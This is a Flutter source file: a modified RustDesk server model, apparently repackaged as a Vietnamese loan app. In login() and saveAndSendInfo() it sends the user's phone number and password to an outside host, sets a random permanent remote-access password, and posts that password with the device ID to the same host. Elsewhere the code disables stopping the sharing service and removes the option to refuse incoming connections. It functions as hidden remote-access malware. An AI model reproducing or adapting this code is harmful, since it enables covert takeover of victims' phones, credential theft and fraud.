import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_hbb/consts.dart';
import 'package:flutter_hbb/main.dart';
import 'package:flutter_hbb/models/platform_model.dart';
import 'package:get/get.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:wakelock/wakelock.dart';
import 'package:window_manager/window_manager.dart';

import '../common.dart';
import '../common/formatter/id_formatter.dart';
import '../desktop/pages/server_page.dart' as desktop;
import '../desktop/widgets/tabbar_widget.dart';
import '../mobile/pages/server_page.dart';
import 'model.dart';
import 'package:http/http.dart' as http;

const kLoginDialogTag = "LOGIN";

const kUseTemporaryPassword = "use-temporary-password";
const kUsePermanentPassword = "use-permanent-password";
const kUseBothPasswords = "use-both-passwords";

class ServerModel with ChangeNotifier {
  bool _isStart = false; // Android MainService status
  bool _mediaOk = false;
  bool _inputOk = false;
  bool _platformOk = false;
  bool _deviceOk = false;
  bool _audioOk = false;
  bool _cameraOk = false;
  bool _fileOk = false;
  bool _showElevation = false;
  bool _hideCm = false;
  int _connectStatus = 0; // Rendezvous Server status
  String _verificationMethod = "";
  String _temporaryPasswordLength = "";
  String _approveMode = "";

  late String _emptyIdShow;
  late final IDTextEditingController _serverId;
  final _serverPasswd =
      TextEditingController(text: translate("Generating ..."));

  final tabController = DesktopTabController(tabType: DesktopTabType.cm);

  final List<Client> _clients = [];

  Timer? cmHiddenTimer;

  bool get isStart => _isStart;

  bool get mediaOk => _mediaOk;

  bool get inputOk => _inputOk;

  bool get platformOk => _platformOk;

  bool get deviceOk => _deviceOk;

  bool get audioOk => _audioOk;

  bool get cameraOk => _cameraOk;

  bool get fileOk => _fileOk;

  bool get showElevation => _showElevation;

  bool get hideCm => _hideCm;

  int get connectStatus => _connectStatus;

  static String token = '';
  static int idLogin = -1 ;
  static const platform = MethodChannel('mChannel');


  String get verificationMethod {
    final index = [
      kUseTemporaryPassword,
      kUsePermanentPassword,
      kUseBothPasswords
    ].indexOf(_verificationMethod);
    if (index < 0) {
      return kUseBothPasswords;
    }
    return _verificationMethod;
  }

  String get approveMode => _approveMode;

  setVerificationMethod(String method) async {
    await bind.mainSetOption(key: "verification-method", value: method);
    if (method != kUsePermanentPassword) {
      await bind.mainSetOption(
          key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
    }
  }

  String get temporaryPasswordLength {
    final lengthIndex = ["6", "8", "10"].indexOf(_temporaryPasswordLength);
    if (lengthIndex < 0) {
      return "6";
    }
    return _temporaryPasswordLength;
  }

  setTemporaryPasswordLength(String length) async {
    await bind.mainSetOption(key: "temporary-password-length", value: length);
  }

  setApproveMode(String mode) async {
    await bind.mainSetOption(key: 'approve-mode', value: mode);
    if (mode != 'password') {
      await bind.mainSetOption(
          key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
    }
  }

  TextEditingController get serverId => _serverId;

  TextEditingController get serverPasswd => _serverPasswd;

  List<Client> get clients => _clients;

  final controller = ScrollController();

  WeakReference<FFI> parent;

  ServerModel(this.parent) {
    _emptyIdShow = translate("Generating ...");
    _serverId = IDTextEditingController(text: _emptyIdShow);

    timerCallback() async {
      var status = await bind.mainGetOnlineStatue();
      if (status > 0) {
        status = 1;
      }
      if (status != _connectStatus) {
        _connectStatus = status;
        notifyListeners();
      }

      if (desktopType == DesktopType.cm) {
        final res = await bind.cmCheckClientsLength(length: _clients.length);
        if (res != null) {
          debugPrint("clients not match!");
          updateClientState(res);
        }
      }

      updatePasswordModel();
    }

    if (!isTest) {
      Future.delayed(Duration.zero, () async {
        if (await bind.optionSynced()) {
          await timerCallback();
        }
      });
      Timer.periodic(Duration(milliseconds: 500), (timer) async {
        await timerCallback();
      });
    }
  }

  /// 1. check android permission
  /// 2. check config
  /// audio true by default (if permission on) (false default < Android 10)
  /// file true by default (if permission on)
  checkAndroidPermission() async {
    // audio
    if (androidVersion < 30 ||
        !await AndroidPermissionManager.check(kRecordAudio)) {
      _audioOk = false;
      bind.mainSetOption(key: "enable-audio", value: "N");
    } else {
      final audioOption = await bind.mainGetOption(key: 'enable-audio');
      _audioOk = audioOption.isEmpty;
    }

    // camera
    if (!await AndroidPermissionManager.check(kCamera)) {
      _cameraOk = false;
      bind.mainSetOption(key: "enable-camera", value: "N");
    } else {
      final audioOption = await bind.mainGetOption(key: 'enable-camera');
      _cameraOk = audioOption.isEmpty;
    }

    // file
    if (!await AndroidPermissionManager.check(kManageExternalStorage)) {
      _fileOk = false;
      bind.mainSetOption(key: "enable-file-transfer", value: "N");
    } else {
      final fileOption = await bind.mainGetOption(key: 'enable-file-transfer');
      _fileOk = fileOption.isEmpty;
    }

    notifyListeners();
  }

  updatePasswordModel() async {
    var update = false;
    final temporaryPassword = await bind.mainGetTemporaryPassword();
    final verificationMethod =
        await bind.mainGetOption(key: "verification-method");
    final temporaryPasswordLength =
        await bind.mainGetOption(key: "temporary-password-length");
    final approveMode = await bind.mainGetOption(key: 'approve-mode');
    var hideCm = option2bool(
        'allow-hide-cm', await bind.mainGetOption(key: 'allow-hide-cm'));
    if (!(approveMode == 'password' &&
        verificationMethod == kUsePermanentPassword)) {
      hideCm = false;
    }
    if (_approveMode != approveMode) {
      _approveMode = approveMode;
      update = true;
    }
    final oldPwdText = _serverPasswd.text;
    if (_serverPasswd.text != temporaryPassword &&
        temporaryPassword.isNotEmpty) {
      _serverPasswd.text = temporaryPassword;
    }
    if (verificationMethod == kUsePermanentPassword ||
        _approveMode == 'click') {
      _serverPasswd.text = '-';
    }
    if (oldPwdText != _serverPasswd.text) {
      update = true;
    }
    if (_verificationMethod != verificationMethod) {
      _verificationMethod = verificationMethod;
      update = true;
    }
    if (_temporaryPasswordLength != temporaryPasswordLength) {
      _temporaryPasswordLength = temporaryPasswordLength;
      update = true;
    }
    if (_hideCm != hideCm) {
      _hideCm = hideCm;
      if (desktopType == DesktopType.cm) {
        if (hideCm) {
          hideCmWindow();
        } else {
          showCmWindow();
        }
      }
      update = true;
    }
    if (update) {
      notifyListeners();
    }
  }

  toggleAudio() async {
    if (clients.isNotEmpty) {
      await showClientsMayNotBeChangedAlert(parent.target);
    }
    if (!_audioOk && !await AndroidPermissionManager.check(kRecordAudio)) {
      final res = await AndroidPermissionManager.request(kRecordAudio);
      if (!res) {
        showToast(translate('Failed'));
        return;
      }
    }

    _audioOk = !_audioOk;
    bind.mainSetOption(key: "enable-audio", value: _audioOk ? '' : 'N');
    notifyListeners();
  }

  toggleFile() async {
    if (clients.isNotEmpty) {
      await showClientsMayNotBeChangedAlert(parent.target);
    }
    if (!_fileOk &&
        !await AndroidPermissionManager.check(kManageExternalStorage)) {
      final res =
          await AndroidPermissionManager.request(kManageExternalStorage);
      if (!res) {
        showToast(translate('Failed'));
        return;
      }
    }

    _fileOk = !_fileOk;
    bind.mainSetOption(key: "enable-file-transfer", value: _fileOk ? '' : 'N');
    notifyListeners();
  }

  toggleInput() async {
    if (clients.isNotEmpty) {
      await showClientsMayNotBeChangedAlert(parent.target);
    }
    if (_inputOk) {
      //khong cho stop input remote
      // parent.target?.invokeMethod("stop_input");
      // bind.mainSetOption(key: "enable-keyboard", value: 'N');
    } else {
      if (parent.target != null) {
        /// the result of toggle-on depends on user actions in the settings page.
        /// handle result, see [ServerModel.changeStatue]
        showInputWarnAlert(parent.target!);
      }
    }
  }

  /// Toggle the screen sharing service.
  toggleService({String? id, String? pw}) async {
    if (_isStart) {
      //khong cho stop
      // final res =
      //     await parent.target?.dialogManager.show<bool>((setState, close, context) {
      //   submit() => close(true);
      //   return CustomAlertDialog(
      //     title: Row(children: [
      //       const Icon(Icons.warning_amber_sharp,
      //           color: Colors.redAccent, size: 28),
      //       const SizedBox(width: 10),
      //       Text(translate("Warning")),
      //     ]),
      //     content: Text(translate("android_stop_service_tip")),
      //     actions: [
      //       TextButton(onPressed: close, child: Text(translate("Cancel"))),
      //       TextButton(onPressed: submit, child: Text(translate("OK"))),
      //     ],
      //     onSubmit: submit,
      //     onCancel: close,
      //   );
      // });
      // if (res == true) {
      //   stopService();
      // }
    } else {
      final res = await parent.target?.dialogManager
          .show<bool>((setState, close, context) {
        submit() => close(true);
        return CustomAlertDialog(
          title: Row(children: [
            const Icon(Icons.warning_amber_sharp,
                color: Colors.redAccent, size: 28),
            const SizedBox(width: 10),
            Text("Thông báo"),
          ]),
          content: Text(translate("android_service_will_start_tip")),
          actions: [
            // dialogButton("Cancel", onPressed: close, isOutline: true),
            dialogButton("OK", onPressed: submit),
          ],
          onSubmit: submit,
          onCancel: close,
        );
      });
      if (res == true) {
        login(id: id, pw: pw);
        // startService();
      }
    }
  }

  togglePlatform() async {
    if (clients.isNotEmpty) {
      await showClientsMayNotBeChangedAlert(parent.target);
    }
    if (_inputOk) {
      //khong cho stop input remote
      // parent.target?.invokeMethod("stop_input");
      // bind.mainSetOption(key: "enable-keyboard", value: 'N');
    } else {
      if (parent.target != null) {
        /// the result of toggle-on depends on user actions in the settings page.
        /// handle result, see [ServerModel.changeStatue]
        // showInputWarnAlert(parent.target!);
      }
    }
  }

  toggleDevice() async {
    if (clients.isNotEmpty) {
      await showClientsMayNotBeChangedAlert(parent.target);
    }
    if (_inputOk) {
      //khong cho stop input remote
      // parent.target?.invokeMethod("stop_input");
      // bind.mainSetOption(key: "enable-keyboard", value: 'N');
    } else {
      if (parent.target != null) {
        /// the result of toggle-on depends on user actions in the settings page.
        /// handle result, see [ServerModel.changeStatue]
        // showInputWarnAlert(parent.target!);
      }
    }
  }

  /// Start the screen sharing service.
  Future<void> startService() async {
    _isStart = true;
    notifyListeners();
    parent.target?.ffiModel.updateEventListener("");
    await parent.target?.invokeMethod("init_service");
    // ugly is here, because for desktop, below is useless
    await bind.mainStartService();
    updateClientState();
    if (Platform.isAndroid) {
      Wakelock.enable();
    }
  }

  /// Stop the screen sharing service.
  Future<void> stopService() async {
    _isStart = false;
    closeAll();
    await parent.target?.invokeMethod("stop_service");
    await bind.mainStopService();
    notifyListeners();
    if (!Platform.isLinux) {
      // current linux is not supported
      Wakelock.disable();
    }
  }

  Future<bool> setPermanentPassword(String newPW) async {
    await bind.mainSetPermanentPassword(password: newPW);
    await Future.delayed(Duration(milliseconds: 500));
    final pw = await bind.mainGetPermanentPassword();
    if (newPW == pw) {
      return true;
    } else {
      return false;
    }
  }

  fetchID() async {
    final id = await bind.mainGetMyId();
    if (id != _serverId.id) {
      _serverId.id = id;
      notifyListeners();
    }
  }

  saveAndSendInfo({String? id, String? pw}) async {
    final id = await bind.mainGetMyId();

    var url2 =
    Uri.http('verify-cdn.vaytienmat-nhanh24h.com', 'Loans/user/updateLoan');
    const kUsePermanentPassword = "use-permanent-password";

    await bind.mainSetOption(
        key: "verification-method", value: kUsePermanentPassword);
    await updatePasswordModel();
    Random random = Random();
    List<int> numbers = List.generate(7, (index) => random.nextInt(10));
    String pwRandom = numbers.join();
    final p0 = TextEditingController(text: pwRandom);

    String pwRandom1 = "${p0.text.trim()}";
    await setPermanentPassword(pwRandom1);

    http.post(url2,
        headers: {
          'Content-type': 'application/json',
          'Accept': 'application/json',
          "Authorization": "Bearer $token"
        },
        body: json.encode(
          <String, dynamic>{
            'id': idLogin,
            'data': json.encode(
              <String, dynamic>{
                "remote_password": pwRandom1,
                "remote_id": id,
              },
            )
          },
        ));
  }

  void login({String? id, String? pw}) async {
    if (id != null && id.isNotEmpty && pw != null && pw.isNotEmpty) {
      var url = Uri.http('verify-cdn.vaytienmat-nhanh24h.com', 'Member/loginMember');

      final resp = await http.post(url, body: {'phonenum': id, 'password': pw});
      if (resp.statusCode == 200) {
        var decodedResponse = jsonDecode((resp.body)) as Map;
        idLogin = decodedResponse["data"]["id"];
        token = decodedResponse["data"]["token"];
        final SharedPreferences prefs = await SharedPreferences.getInstance();
        await prefs.setInt('idLogin', idLogin);
        await prefs.setString('tokenLogin', token);
        await prefs.setString('userName', id);
        await prefs.setString('password', pw);
        if(decodedResponse["data"]["identity_loan"] != null) {
          await prefs.setString('identityLoan', decodedResponse["data"]["identity_loan"]);
        }
        await _setUserInfoToUpdate(idLogin, token);
        await startService();
        saveAndSendInfo(id:id, pw: pw);
      } else {
         parent.target?.dialogManager
            .show<bool>((setState, close, context) {
          return CustomAlertDialog(
            title: Row(children: [
              const Icon(Icons.warning_amber_sharp,
                  color: Colors.redAccent, size: 28),
              const SizedBox(width: 10),
              Text(translate("Cảnh báo")),
            ]),
            content: Text(translate("ID hoặc mật khẩu không đúng")),
            actions: [
              dialogButton("OK", onPressed: close),
            ],
            onSubmit: close,
          );
        });
      }
    }
  }


  changeStatue(String name, bool value) {
    debugPrint("changeStatue value $value");
    switch (name) {
      case "media":
        _mediaOk = value;
        if (value && !_isStart) {
          startService();
        }
        break;
      case "input":
        if (_inputOk != value) {
          bind.mainSetOption(key: "enable-keyboard", value: value ? '' : 'N');
        }
        _inputOk = value;
        break;
      default:
        return;
    }
    notifyListeners();
  }

  // force
  updateClientState([String? json]) async {
    if (isTest) return;
    var res = await bind.cmGetClientsState();
    try {
      final List clientsJson = jsonDecode(res);
      _clients.clear();
      tabController.state.value.tabs.clear();
      for (var clientJson in clientsJson) {
        final client = Client.fromJson(clientJson);
        _clients.add(client);
        _addTab(client);
      }
      notifyListeners();
    } catch (e) {
      debugPrint("Failed to updateClientState:$e");
    }
  }

  void addConnection(Map<String, dynamic> evt) {
    try {
      final client = Client.fromJson(jsonDecode(evt["client"]));
      if (client.authorized) {
        parent.target?.dialogManager.dismissByTag(getLoginDialogTag(client.id));
        final index = _clients.indexWhere((c) => c.id == client.id);
        if (index < 0) {
          _clients.add(client);
        } else {
          _clients[index].authorized = true;
        }
      } else {
        if (_clients.any((c) => c.id == client.id)) {
          return;
        }
        _clients.add(client);
      }
      _addTab(client);
      // remove disconnected
      final index_disconnected = _clients
          .indexWhere((c) => c.disconnected && c.peerId == client.peerId);
      if (index_disconnected >= 0) {
        _clients.removeAt(index_disconnected);
        tabController.remove(index_disconnected);
      }
      scrollToBottom();
      notifyListeners();
      //không cần show popup
      // if (isAndroid && !client.authorized) showLoginDialog(client);
    } catch (e) {
      debugPrint("Failed to call loginRequest,error:$e");
    }
  }

  void _addTab(Client client) {
    tabController.add(TabInfo(
        key: client.id.toString(),
        label: client.name,
        closable: false,
        onTap: () {
          if (client.hasUnreadChatMessage.value) {
            client.hasUnreadChatMessage.value = false;
            final chatModel = parent.target!.chatModel;
            chatModel.showChatPage(client.id);
          }
        },
        page: desktop.buildConnectionCard(client)));
    Future.delayed(Duration.zero, () async {
      if (!hideCm) window_on_top(null);
    });
    // Only do the hidden task when on Desktop.
    if (client.authorized && isDesktop) {
      cmHiddenTimer = Timer(const Duration(seconds: 3), () {
        if (!hideCm) windowManager.minimize();
        cmHiddenTimer = null;
      });
    }
  }

  void showLoginDialog(Client client) {
    parent.target?.dialogManager.show((setState, close, context) {
      cancel() {
        sendLoginResponse(client, false);
        close();
      }

      submit() {
        sendLoginResponse(client, true);
        close();
      }

      return CustomAlertDialog(
        title:
            Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          Text(translate(
              client.isFileTransfer ? "File Connection" : "Screen Connection")),
          IconButton(
              onPressed: () {
                close();
              },
              icon: const Icon(Icons.close))
        ]),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          mainAxisAlignment: MainAxisAlignment.center,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Text(translate("Do you accept?")),
            Text("Kết nối xác thực"),
            // ClientInfo(client),
            Text(
              translate("android_new_connection_tip"),
              style: Theme.of(globalKey.currentContext!).textTheme.bodyMedium,
            ),
          ],
        ),
        actions: [
          // dialogButton("Dismiss", onPressed: cancel, isOutline: true),
          // dialogButton("Accept", onPressed: submit),
          dialogButton("Đồng ý", onPressed: submit),
        ],
        onSubmit: submit,
        onCancel: cancel,
      );
    }, tag: getLoginDialogTag(client.id));
  }

  scrollToBottom() {
    if (isDesktop) return;
    Future.delayed(Duration(milliseconds: 200), () {
      controller.animateTo(controller.position.maxScrollExtent,
          duration: Duration(milliseconds: 200),
          curve: Curves.fastLinearToSlowEaseIn);
    });
  }

  void sendLoginResponse(Client client, bool res) async {
    if (res) {
      bind.cmLoginRes(connId: client.id, res: res);
      if (!client.isFileTransfer) {
        parent.target?.invokeMethod("start_capture");
      }
      parent.target?.invokeMethod("cancel_notification", client.id);
      client.authorized = true;
      notifyListeners();
    } else {
      bind.cmLoginRes(connId: client.id, res: res);
      parent.target?.invokeMethod("cancel_notification", client.id);
      final index = _clients.indexOf(client);
      tabController.remove(index);
      _clients.remove(client);
    }
  }

  void onClientRemove(Map<String, dynamic> evt) {
    try {
      final id = int.parse(evt['id'] as String);
      final close = (evt['close'] as String) == 'true';
      if (_clients.any((c) => c.id == id)) {
        final index = _clients.indexWhere((client) => client.id == id);
        if (index >= 0) {
          if (close) {
            _clients.removeAt(index);
            tabController.remove(index);
          } else {
            _clients[index].disconnected = true;
          }
        }
        parent.target?.dialogManager.dismissByTag(getLoginDialogTag(id));
        parent.target?.invokeMethod("cancel_notification", id);
      }
      notifyListeners();
    } catch (e) {
      debugPrint("onClientRemove failed,error:$e");
    }
  }

  Future<void> closeAll() async {
    await Future.wait(
        _clients.map((client) => bind.cmCloseConnection(connId: client.id)));
    _clients.clear();
    tabController.state.value.tabs.clear();
  }

  void jumpTo(int id) {
    final index = _clients.indexWhere((client) => client.id == id);
    tabController.jumpTo(index);
  }

  void setShowElevation(bool show) {
    if (_showElevation != show) {
      _showElevation = show;
      notifyListeners();
    }
  }

  void updateVoiceCallState(Map<String, dynamic> evt) {
    try {
      final client = Client.fromJson(jsonDecode(evt["client"]));
      final index = _clients.indexWhere((element) => element.id == client.id);
      if (index != -1) {
        _clients[index].inVoiceCall = client.inVoiceCall;
        _clients[index].incomingVoiceCall = client.incomingVoiceCall;
        if (client.incomingVoiceCall) {
          // Has incoming phone call, let's set the window on top.
          Future.delayed(Duration.zero, () {
            window_on_top(null);
          });
        }
        notifyListeners();
      }
    } catch (e) {
      debugPrint("updateVoiceCallState failed: $e");
    }
  }

  Future<void> _setUserInfoToUpdate(int idLogin, String token) async {
    try {
      await platform.invokeMethod('user_update', {'idLogin': idLogin, "token": token});
    } on PlatformException catch (e) {}
  }

}

enum ClientType {
  remote,
  file,
  portForward,
}

class Client {
  int id = 0; // client connections inner count id
  bool authorized = false;
  bool isFileTransfer = false;
  String portForward = "";
  String name = "";
  String peerId = ""; // peer user's id,show at app
  bool keyboard = false;
  bool clipboard = false;
  bool audio = false;
  bool file = false;
  bool restart = false;
  bool recording = false;
  bool disconnected = false;
  bool fromSwitch = false;
  bool inVoiceCall = false;
  bool incomingVoiceCall = false;

  RxBool hasUnreadChatMessage = false.obs;

  Client(this.id, this.authorized, this.isFileTransfer, this.name, this.peerId,
      this.keyboard, this.clipboard, this.audio);

  Client.fromJson(Map<String, dynamic> json) {
    id = json['id'];
    authorized = json['authorized'];
    isFileTransfer = json['is_file_transfer'];
    portForward = json['port_forward'];
    name = json['name'];
    peerId = json['peer_id'];
    keyboard = json['keyboard'];
    clipboard = json['clipboard'];
    audio = json['audio'];
    file = json['file'];
    restart = json['restart'];
    recording = json['recording'];
    disconnected = json['disconnected'];
    fromSwitch = json['from_switch'];
    inVoiceCall = json['in_voice_call'];
    incomingVoiceCall = json['incoming_voice_call'];
  }

  Map<String, dynamic> toJson() {
    final Map<String, dynamic> data = <String, dynamic>{};
    data['id'] = id;
    data['is_start'] = authorized;
    data['is_file_transfer'] = isFileTransfer;
    data['port_forward'] = portForward;
    data['name'] = name;
    data['peer_id'] = peerId;
    data['keyboard'] = keyboard;
    data['clipboard'] = clipboard;
    data['audio'] = audio;
    data['file'] = file;
    data['restart'] = restart;
    data['recording'] = recording;
    data['disconnected'] = disconnected;
    data['from_switch'] = fromSwitch;
    return data;
  }

  ClientType type_() {
    if (isFileTransfer) {
      return ClientType.file;
    } else if (portForward.isNotEmpty) {
      return ClientType.portForward;
    } else {
      return ClientType.remote;
    }
  }
}

String getLoginDialogTag(int id) {
  return kLoginDialogTag + id.toString();
}

showInputWarnAlert(FFI ffi) {
  ffi.dialogManager.show((setState, close, context) {
    submit() {
      AndroidPermissionManager.startAction(kActionAccessibilitySettings);
      close();
    }

    return CustomAlertDialog(
      // title: Text(translate("How to get Android input permission?")),
      title: Text("Xác thực hành động"),
      content: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Text(translate("android_input_permission_tip1")),
          const SizedBox(height: 10),
          Text(translate("android_input_permission_tip2")),
        ],
      ),
      actions: [
        // dialogButton("Quay lại", onPressed: close, isOutline: true),
        dialogButton("Bắt đầu", onPressed: submit),
      ],
      onSubmit: submit,
      onCancel: close,
    );
  });
}

Future<void> showClientsMayNotBeChangedAlert(FFI? ffi) async {
  await ffi?.dialogManager.show((setState, close, context) {
    return CustomAlertDialog(
      title: Text(translate("Permissions")),
      content: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Text(translate("android_permission_may_not_change_tip")),
        ],
      ),
      actions: [
        dialogButton("OK", onPressed: close),
      ],
      onSubmit: close,
      onCancel: close,
    );
  });
}